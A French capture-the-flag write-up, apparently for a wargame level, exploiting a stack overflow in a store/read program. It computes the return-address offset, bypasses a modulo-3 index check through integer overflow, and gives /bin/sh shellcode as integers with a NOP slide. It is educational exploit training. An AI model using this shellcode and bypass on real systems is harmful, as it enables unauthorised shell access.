Ce programme nous permet d'entrer une command de {store;read;quit}, ce qui va nous permettre d'ecrire ou de lire un buffer.

Il n'y a pas de bounds check donc on peut theoriquement overwrite la stack, y compris RIP.

## Trouver EIP
```
push %ebp -> 4 bytes
push %edi -> 4 bytes
push %esi -> 4 bytes
push %ebx -> 4 bytes
and 0xfffffff0,%esp -> alignement de esp a 16 bytes. Avec gdb on peut voir que esp = 0xffffd70c, donc on enleve 0xc = 12 bytes
sub 464,%esp -> 464 bytes
...
lea 36(%esp),%ebx -> on charge l'adresse pointee par esp + 36 bytes pour le buffer
```

L'addresse de EIP relative au buffer est: \
4 * 4 + 12 + 464 - 36 = 456 bytes

## Trouver l'index
Pour avoir l'index on divise par la taille d'un int: 456 / 4 = 114 \
114 est divisible par 3, donc on ne pourra pas utiliser cet index directement.

L'index est multipliee par 4 en faisant un shl de 2 juste avant le mov, donc le check % 3 peut etre contourne en jouant avec l'un des 2 haut bits car ils seront jetes apres, ce qui rendra l'index non divisible par 3.

Exemple:
> Index de base: 0b10000000000000000000000000000000 = 2147483648 \
> Index final: 2147483648 + 114 = 2147483762

## Le shellcode
Nous allons utiliser le buffer pour injecter notre shellcode en utilisant store. En utilisant gdb on voit que l'adresse reelle du buffer est 0xffffd554 (4294956372). Cependant, l'adresse peut changer de plusieurs bytes a chaque nouveau lancement. On injectera donc notre shellcode avec une nop slide.
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:	push   %ebp
    ...
   0x08048791 <+110>:	lea    0x24(%esp),%ebx
   0x08048795 <+114>:	mov    $0x0,%eax

(gdb) b *0x08048795
Breakpoint 1 at 0x8048795
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048795 in main ()
(gdb) info registers
...
ebx            0xffffd554
...
```

On doit regrouper notre shellcode par paquet de 4 et inverser l'ordre des bytes:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
```
31 c9 f7 e1
b0 0b 51 68
2f 2f 73 68
68 2f 62 69
6e 89 e3 cd
80 00 00 00
```
```
e1 f7 c9 31
68 51 0b b0
68 73 2f 2f
69 62 2f 68
cd e3 89 6e
00 00 00 80
```
```
3791112497
1750141872
1752379183
1768042344
3454241134
128
```
La nop slide:
90909090 = 2425393296
